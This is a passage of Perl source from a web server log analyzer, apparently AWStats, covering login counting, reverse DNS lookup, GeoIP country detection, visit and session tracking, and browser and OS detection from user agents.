Login\n\t\t\t#---------------\n\t\t\tif (   $pos_logname >= 0\n\t\t\t\t&& $field[$pos_logname]\n\t\t\t\t&& $field[$pos_logname] ne '-' )\n\t\t\t{\n\t\t\t\t$field[$pos_logname] =~\n\t\t\t\t  s/ /_/g;    # This is to allow space in logname\n\t\t\t\tif ( $LogFormat eq '6' ) {\n\t\t\t\t\t$field[$pos_logname] =~ s/^\\\"//;\n\t\t\t\t\t$field[$pos_logname] =~ s/\\\"$//;\n\t\t\t\t}             # logname field has \" with Domino 6+\n\t\t\t\tif ($AuthenticatedUsersNotCaseSensitive) {\n\t\t\t\t\t$field[$pos_logname] = lc( $field[$pos_logname] );\n\t\t\t\t}\n\n\t\t\t\t# We found an authenticated user\n\t\t\t\tif ($PageBool) {\n\t\t\t\t\t$_login_p{ $field[$pos_logname] }++;\n\t\t\t\t}             #Count accesses for page (page)\n\t\t\t\tif ($countedtraffic != 6){$_login_h{$field[$pos_logname]}++;}         #Count accesses for page (hit)\n\t\t\t\tif ($pos_size>0){$_login_k{ $field[$pos_logname] } +=\n\t\t\t\t  int( $field[$pos_size] );}    #Count accesses for page (kb)\n\t\t\t\t$_login_l{ $field[$pos_logname] } = $timerecord;\n\t\t\t}\n\t\t}\n\n\t\t# Do DNS lookup\n\t\t#--------------\n\t\tmy $Host         = $field[$pos_host];\n\t\tmy $HostResolved = ''\n\t\t  ; # HostResolved will be defined in next paragraf if countedtraffic is true\n\n\t\tif( $Host =~ /^([^:]+):[0-9]+$/ ){ # Host may sometimes have an ip:port syntax (ex: 54.32.12.12:60321)\n\t\t    $Host = $1;\n\t\t}\n\n\n\t\tif ( !$countedtraffic || $countedtraffic == 6) {\n\t\t\tmy $ip = 0;\n\t\t\tif ($DNSLookup) {    # DNS lookup is 1 or 2\n\t\t\t\tif ( $Host =~ /$regipv4l/o ) {    # IPv4 lighttpd\n\t\t\t\t\t$Host =~ s/^::ffff://;\n\t\t\t\t\t$ip = 4;\n\t\t\t\t}\n\t\t\t\telsif ( $Host =~ /$regipv4/o ) { $ip = 4; }    # IPv4\n\t\t\t\telsif ( $Host =~ /$regipv6/o ) { $ip = 6; }    # IPv6\n\t\t\t\tif ($ip) {\n\n\t\t\t\t\t# Check in static DNS cache file\n\t\t\t\t\t$HostResolved = $MyDNSTable{$Host};\n\t\t\t\t\tif ($HostResolved) {\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  DNS lookup asked for $Host and found in static DNS cache file: $HostResolved\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $DNSLookup == 1 ) {\n\n\t\t   # Check in session cache (dynamic DNS cache file + session DNS cache)\n\t\t\t\t\t\t$HostResolved = $TmpDNSLookup{$Host};\n\t\t\t\t\t\tif ( !$HostResolved ) {\n\t\t\t\t\t\t\tif ( @SkipDNSLookupFor && &SkipDNSLookup($Host) ) {\n\t\t\t\t\t\t\t\t$HostResolved = $TmpDNSLookup{$Host} = '*';\n\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\tdebug(\n\"  No need of reverse DNS lookup for $Host, skipped at user request.\",\n\t\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $ip == 4 ) {\n\t\t\t\t\t\t\t\t\tmy $lookupresult =\n\t\t\t\t\t\t\t\t\t  gethostbyaddr(\n\t\t\t\t\t\t\t\t\t\tpack( \"C4\", split( /\\./, $Host ) ),\n\t\t\t\t\t\t\t\t\t\tAF_INET )\n\t\t\t\t\t\t\t\t\t  ; # This is very slow, may spend 20 seconds\n\t\t\t\t\t\t\t\t\tif (   !$lookupresult\n\t\t\t\t\t\t\t\t\t\t|| $lookupresult =~ /$regipv4/o\n\t\t\t\t\t\t\t\t\t\t|| !IsAscii($lookupresult) )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} = $HostResolved =\n\t\t\t\t\t\t\t\t\t\t  '*';\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} = $HostResolved =\n\t\t\t\t\t\t\t\t\t\t  $lookupresult;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\t\tdebug(\n\"  Reverse DNS lookup for $Host done: $HostResolved\",\n\t\t\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telsif ( $ip == 6 ) {\n\t\t\t\t\t\t\t\t\tif ( $PluginsLoaded{'GetResolvedIP'}\n\t\t\t\t\t\t\t\t\t\t{'ipv6'} )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tmy $lookupresult =\n\t\t\t\t\t\t\t\t\t\t  GetResolvedIP_ipv6($Host);\n\t\t\t\t\t\t\t\t\t\tif (   !$lookupresult\n\t\t\t\t\t\t\t\t\t\t\t|| !IsAscii($lookupresult) )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} =\n\t\t\t\t\t\t\t\t\t\t\t  $HostResolved = '*';\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} =\n\t\t\t\t\t\t\t\t\t\t\t  $HostResolved = $lookupresult;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} = $HostResolved =\n\t\t\t\t\t\t\t\t\t\t  '*';\n\t\t\t\t\t\t\t\t\t\twarning(\n\"Reverse DNS lookup for $Host not available without ipv6 plugin enabled.\"\n\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse { error(\"Bad value vor ip\"); }\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\t$HostResolved = '*';\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  DNS lookup by static DNS cache file asked for $Host but not found.\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  DNS lookup asked for $Host but this is not an IP address.\",\n\t\t\t\t\t\t\t4\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$DNSLookupAlreadyDone = $LogFile;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tif ( $Host =~ /$regipv4l/o ) {\n\t\t\t\t\t$Host =~ s/^::ffff://;\n\t\t\t\t\t$HostResolved = '*';\n\t\t\t\t\t$ip           = 4;\n\t\t\t\t}\n\t\t\t\telsif ( $Host =~ /$regipv4/o ) {\n\t\t\t\t\t$HostResolved = '*';\n\t\t\t\t\t$ip           = 4;\n\t\t\t\t}    # IPv4\n\t\t\t\telsif ( $Host =~ /$regipv6/o ) {\n\t\t\t\t\t$HostResolved = '*';\n\t\t\t\t\t$ip           = 6;\n\t\t\t\t}    # IPv6\n\t\t\t\tif ($Debug) { debug( \"  No DNS lookup asked.\", 4 ); }\n\t\t\t}\n\n\t\t\t# Analyze: Country (Top-level domain)\n\t\t\t#------------------------------------\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\"  Search country (Host=$Host HostResolved=$HostResolved ip=$ip)\",\n\t\t\t\t\t4\n\t\t\t\t);\n\t\t\t}\n\t\t\tmy $Domain = 'ip';\n\n\t\t\t# Set $HostResolved to host and resolve domain\n\t\t\tif ( $HostResolved eq '*' ) {\n\n# $Host is an IP address and is not resolved (failed or not asked) or resolution gives an IP address\n\t\t\t\t$HostResolved = $Host;\n\n\t\t\t\t# Resolve Domain\n\t\t\t\tif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip6'} ) {\n\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoip6($HostResolved);\n\t\t\t\t}\n\t\t\t\telsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'} ) {\n\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoip($HostResolved);\n\t\t\t\t}\n\n#\t\t\telsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($HostResolved); }\n#\t\t\telsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($HostResolved); }\n\t\t\t\telsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} ) {\n\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoipfree($HostResolved);\n\t\t\t\t}\n\t\t\t\tif ($AtLeastOneSectionPlugin) {\n\t\t\t\t\tforeach my $pluginname (\n\t\t\t\t\t\tkeys %{ $PluginsLoaded{'SectionProcessIp'} } )\n\t\t\t\t\t{\n\t\t\t\t\t\tmy $function = \"SectionProcessIp_$pluginname\";\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug( \"  Call to plugin function $function\", 5 );\n\t\t\t\t\t\t}\n\t\t\t\t\t\t&$function($HostResolved);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\n# $Host was already a host name ($ip=0, $Host=name, $HostResolved='') or has been resolved ($ip>0, $Host=ip, $HostResolved defined)\n\t\t\t\t$HostResolved = lc( $HostResolved ? $HostResolved : $Host );\n\n\t\t\t\t# Resolve Domain\n\t\t\t\tif ($ip)\n\t\t\t\t{    # If we have ip, we use it in priority instead of hostname\n\t\t\t\t\tif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip6'} ) {\n\t\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoip6($Host);\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'} ) {\n\t\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoip($Host);\n\t\t\t\t\t}\n\n#\t\t\t\telsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($Host); }\n#\t\t\t\telsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($Host); }\n\t\t\t\t\telsif (\n\t\t\t\t\t\t$PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} )\n\t\t\t\t\t{\n\t\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoipfree($Host);\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $HostResolved =~ /\\.(\\w+)$/ ) { $Domain = $1; }\n\t\t\t\t\tif ($AtLeastOneSectionPlugin) {\n\t\t\t\t\t\tforeach my $pluginname (\n\t\t\t\t\t\t\tkeys %{ $PluginsLoaded{'SectionProcessIp'} } )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmy $function = \"SectionProcessIp_$pluginname\";\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug( \"  Call to plugin function $function\",\n\t\t\t\t\t\t\t\t\t5 );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t&$function($Host);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tif ( $PluginsLoaded{'GetCountryCodeByName'}{'geoip6'} ) {\n\t\t\t\t\t\t$Domain = GetCountryCodeByName_geoip6($HostResolved);\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $PluginsLoaded{'GetCountryCodeByName'}{'geoip'} ) {\n\t\t\t\t\t\t$Domain = GetCountryCodeByName_geoip($HostResolved);\n\t\t\t\t\t}\n\n#\t\t\t\telsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByName_geoip_region_maxmind($HostResolved); }\n#\t\t\t\telsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByName_geoip_city_maxmind($HostResolved); }\n\t\t\t\t\telsif (\n\t\t\t\t\t\t$PluginsLoaded{'GetCountryCodeByName'}{'geoipfree'} )\n\t\t\t\t\t{\n\t\t\t\t\t\t$Domain = GetCountryCodeByName_geoipfree($HostResolved);\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $HostResolved =~ /\\.(\\w+)$/ ) { $Domain = $1; }\n\t\t\t\t\tif ($AtLeastOneSectionPlugin) {\n\t\t\t\t\t\tforeach my $pluginname (\n\t\t\t\t\t\t\tkeys %{ $PluginsLoaded{'SectionProcessHostname'} } )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmy $function = \"SectionProcessHostname_$pluginname\";\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug( \"  Call to plugin function $function\",\n\t\t\t\t\t\t\t\t\t5 );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t&$function($HostResolved);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Store country\n\t\t\tif ($PageBool) { $_domener_p{$Domain}++; }\n\t\t\tif ($countedtraffic != 6){$_domener_h{$Domain}++;}\n\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t$_domener_k{$Domain} += int( $field[$pos_size] );\n\t\t\t}\n\n\t\t\t# Analyze: Host, URL entry+exit and Session\n\t\t\t#------------------------------------------\n\t\t\tif ($PageBool) {\n\t\t\t\tmy $timehostl = $_host_l{$HostResolved};\n\t\t\t\tif ($timehostl) {\n\n# A visit for this host was already detected\n# TODO everywhere there is $VISITTIMEOUT\n#\t\t\t\t$timehostl =~ /^\\d\\d\\d\\d\\d\\d(\\d\\d)/; my $daytimehostl=$1;\n#\t\t\t\tif ($timerecord > ($timehostl+$VISITTIMEOUT+($dateparts[3]>$daytimehostl?$NEWDAYVISITTIMEOUT:0))) {\n\t\t\t\t\tif ( $timerecord > ( $timehostl + $VISITTIMEOUT ) ) {\n\n\t\t\t\t\t\t# This is a second visit or more\n\t\t\t\t\t\tif ( !$_waithost_s{$HostResolved} ) {\n\n\t\t\t\t\t\t\t# This is a second visit or more\n\t\t\t\t\t\t\t# We count 'visit','exit','entry','DayVisits'\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug(\n\"  This is a second visit for $HostResolved.\",\n\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tmy $timehosts = $_host_s{$HostResolved};\n\t\t\t\t\t\t\tmy $page      = $_host_u{$HostResolved};\n\t\t\t\t\t\t\tif ($page) { $_url_x{$page}++; }\n\t\t\t\t\t\t\t$_url_e{ $field[$pos_url] }++;\n\t\t\t\t\t\t\t$DayVisits{$yearmonthdayrecord}++;\n\n\t\t\t\t # We can't count session yet because we don't have the start so\n\t\t\t\t # we save params of first 'wait' session\n\t\t\t\t\t\t\t$_waithost_l{$HostResolved} = $timehostl;\n\t\t\t\t\t\t\t$_waithost_s{$HostResolved} = $timehosts;\n\t\t\t\t\t\t\t$_waithost_u{$HostResolved} = $page;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t # This is third visit or more\n\t\t\t\t\t\t # We count 'session','visit','exit','entry','DayVisits'\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug(\n\"  This is a third visit or more for $HostResolved.\",\n\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tmy $timehosts = $_host_s{$HostResolved};\n\t\t\t\t\t\t\tmy $page      = $_host_u{$HostResolved};\n\t\t\t\t\t\t\tif ($page) { $_url_x{$page}++; }\n\t\t\t\t\t\t\t$_url_e{ $field[$pos_url] }++;\n\t\t\t\t\t\t\t$DayVisits{$yearmonthdayrecord}++;\n\t\t\t\t\t\t\tif ($timehosts) {\n\t\t\t\t\t\t\t\t$_session{ GetSessionRange( $timehosts,\n\t\t\t\t\t\t\t\t\t\t$timehostl ) }++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Save new session properties\n\t\t\t\t\t\t$_host_s{$HostResolved} = $timerecord;\n\t\t\t\t\t\t$_host_l{$HostResolved} = $timerecord;\n\t\t\t\t\t\t$_host_u{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $timerecord > $timehostl ) {\n\n\t\t\t\t\t\t# This is a same visit we can count\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  This is same visit still running for $HostResolved. host_l/host_u changed to $timerecord/$field[$pos_url]\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_host_l{$HostResolved} = $timerecord;\n\t\t\t\t\t\t$_host_u{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $timerecord == $timehostl ) {\n\n\t\t\t\t\t\t# This is a same visit we can count\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  This is same visit still running for $HostResolved. host_l/host_u changed to $timerecord/$field[$pos_url]\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_host_u{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $timerecord < $_host_s{$HostResolved} ) {\n\n\t\t\t\t\t   # Should happens only with not correctly sorted log files\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  This is same visit still running for $HostResolved with start not in order. host_s changed to $timerecord (entry page also changed if first visit)\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !$_waithost_s{$HostResolved} ) {\n\n# We can reorder entry page only if it's the first visit found in this update run (The saved entry page was $_waithost_e if $_waithost_s{$HostResolved} is not defined. If second visit or more, entry was directly counted and not saved)\n\t\t\t\t\t\t\t$_waithost_e{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\n# We can't change entry counted as we dont't know what was the url counted as entry\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_host_s{$HostResolved} = $timerecord;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  This is same visit still running for $HostResolved with hit between start and last hits. No change\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\n# This is a new visit (may be). First new visit found for this host. We save in wait array the entry page to count later\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  New session (may be) for $HostResolved. Save in wait array to see later\",\n\t\t\t\t\t\t\t4\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$_waithost_e{$HostResolved} = $field[$pos_url];\n\n\t\t\t\t\t# Save new session properties\n\t\t\t\t\t$_host_u{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t$_host_s{$HostResolved} = $timerecord;\n\t\t\t\t\t$_host_l{$HostResolved} = $timerecord;\n\t\t\t\t}\n\t\t\t\t$_host_p{$HostResolved}++;\n\t\t\t}\n\t\t\t$_host_h{$HostResolved}++;\n\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t$_host_k{$HostResolved} += int( $field[$pos_size] );\n\t\t\t}\n\n\t\t\t# Analyze: Browser - OS\n\t\t\t#----------------------\n\t\t\tif ( $pos_agent >= 0 ) {\n\n\t\t\t\tif ($LevelForBrowsersDetection) {\n\n\t\t\t\t\t# Analyze: Browser\n\t\t\t\t\t#-----------------\n\t\t\t\t\tmy $uabrowser = $TmpBrowser{$UserAgent};\n\t\t\t\t\tif ( !$uabrowser ) {\n\t\t\t\t\t\tmy $found = 1;\n\n\t\t\t\t\t\t# Edge (must be at beginning)\n\t\t\t\t\t\tif ($UserAgent =~ /$regveredge/o)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t$_browser_h{\"edge$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"edge$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"edge$1\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\t# Opera ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regveropera/o ) {\t# !!!! version number in in regex $1 or $2 !!!\n\t\t\t\t\t\t    $_browser_h{\"opera\".($1||$2)}++;\n\t\t\t\t\t\t    if ($PageBool) { $_browser_p{\"opera\".($1||$2)}++; }\n\t\t\t\t\t\t    $TmpBrowser{$UserAgent} = \"opera\".($1||$2);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\t# Firefox ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regverfirefox/o\n\t\t\t\t\t\t    && $UserAgent !~ /$regnotfirefox/o )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t    $_browser_h{\"firefox$1\"}++;\n\t\t\t\t\t\t    if ($PageBool) { $_browser_p{\"firefox$1\"}++; }\n\t\t\t\t\t\t    $TmpBrowser{$UserAgent} = \"firefox$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Chrome ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regverchrome/o ) {\n\t\t\t\t\t\t\t$_browser_h{\"chrome$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"chrome$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"chrome$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Safari ?\n\t\t\t\t\t\telsif ($UserAgent =~ /$regversafari/o\n\t\t\t\t\t\t\t&& $UserAgent !~ /$regnotsafari/o )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmy $safariver = $BrowsersSafariBuildToVersionHash{$1};\n\t\t\t\t\t\t\tif ( $UserAgent =~ /$regversafariver/o ) {\n\t\t\t\t\t\t\t\t$safariver = $1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_browser_h{\"safari$safariver\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"safari$safariver\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"safari$safariver\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Konqueror ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regverkonqueror/o ) {\n\t\t\t\t\t\t\t$_browser_h{\"konqueror$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"konqueror$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"konqueror$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Subversion ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regversvn/o ) {\n\t\t\t\t\t\t\t$_browser_h{\"svn$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"svn$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"svn$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# IE < 11 ? (must be at end of test)\n\t\t\t\t\t\telsif ($UserAgent =~ /$regvermsie/o\n\t\t\t\t\t\t\t&& $UserAgent !~ /$regnotie/o )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t$_browser_h{\"msie$2\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"msie$2\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"msie$2\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\t# IE >= 11\n                        elsif ($UserAgent =~ /$regvermsie11/o && $UserAgent !~ /$regnotie/o)\n\t\t\t\t\t\t{\n                            $_browser_h{\"msie$2\"}++;\n                            if ($PageBool) { $_browser_p{\"msie$2\"}++; }\n                            $TmpBrowser{$UserAgent} = \"msie$2\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Netscape 6.x, 7.x ... ? (must be at end of test)\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regvernetscape/o ) {\n\t\t\t\t\t\t\t$_browser_h{\"netscape$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"netscape$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"netscape$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Netscape 3.x, 4.x ... ? (must be at end of test)\n\t\t\t\t\t\telsif ($UserAgent =~ /$regvermozilla/o\n\t\t\t\t\t\t\t&& $UserAgent !~ /$regnotnetscape/o )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t$_browser_h{\"netscape$2\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"netscape$2\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"netscape$2\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Other known browsers ?\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t$found = 0;\n\t\t\t\t\t\t\tforeach (@BrowsersSearchIDOrder)\n\t\t\t\t\t\t\t{    # Search ID in order of BrowsersSearchIDOrder\n\t\t\t\t\t\t\t\tif ( $UserAgent =~ /$_/ ) {\n\t\t\t\t\t\t\t\t\tmy $browser = &UnCompileRegex($_);\n\n\t\t\t\t\t\t\t\t   # TODO If browser is in a family, use version\n\t\t\t\t\t\t\t\t\t$_browser_h{\"$browser\"}++;\n\t\t\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"$browser\"}++; }\n\t\t\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"$browser\";\n\t\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Unknown browser ?\n\t\t\t\t\t\tif ( !$found ) {\n\t\t\t\t\t\t\t$_browser_h{'Unknown'}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{'Unknown'}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = 'Unknown';\n\t\t\t\t\t\t\tmy $newua = $UserAgent;\n\t\t\t\t\t\t\t$newua =~ tr/\\+ /__/;\n\t\t\t\t\t\t\t$_unknownrefererbrowser_l{$newua} = $timerecord;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\t$_browser_h{$uabrowser}++;\n\t\t\t\t\t\tif ($PageBool) { $_browser_p{$uabrowser}++; }\n\t\t\t\t\t\tif ( $uabrowser eq 'Unknown' ) {\n\t\t\t\t\t\t\tmy $newua = $UserAgent;\n\t\t\t\t\t\t\t$newua =~ tr/\\+ /__/;\n\t\t\t\t\t\t\t$_unknownrefererbrowser_l{$newua} = $timerecord;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t\tif ($LevelForOSDetection) {\n\n\t\t\t\t\t# Analyze: OS\n\t\t\t\t\t#------------\n\t\t\t\t\tmy $uaos = $TmpOS{$UserAgent};\n\t\t\t\t\tif ( !$uaos ) {\n\t\t\t\t\t\tmy $found = 0;\n\n\t\t\t\t\t\t# in OSHashID list ?\n\t\t\t\t\t\tforeach (@OSSearchIDOrder)\n\t\t\t\t\t\t{    # Search ID in order of OSSearchIDOrder\n\t\t\t\t\t\t\tif ( $UserAgent =~ /$_/ ) {\n\t\t\t\t\t\t\t\tmy $osid = $OSHashID{ &UnCompileRegex($_) };\n\t\t\t\t\t\t\t\t$_os_h{\"$osid\"}++;\n\t\t\t\t\t\t\t\tif ($PageBool) { $_os_p{\"$osid\"}++; }\n\t\t\t\t\t\t\t\t$TmpOS{$UserAgent} = \"$osid\";\n\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Unknown OS ?\n\t\t\t\t\t\tif ( !$found ) {\n\t\t\t\t\t\t\t$_os_h{'Unknown'}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_os_p{'Unknown'}++; }\n\t\t\t\t\t\t\t$TmpOS{$UserAgent} = 'Unknown';\n\t\t\t\t\t\t\tmy $newua = $UserAgent;\n\t\t\t\t\t\t\t$newua =~ tr/\\+ 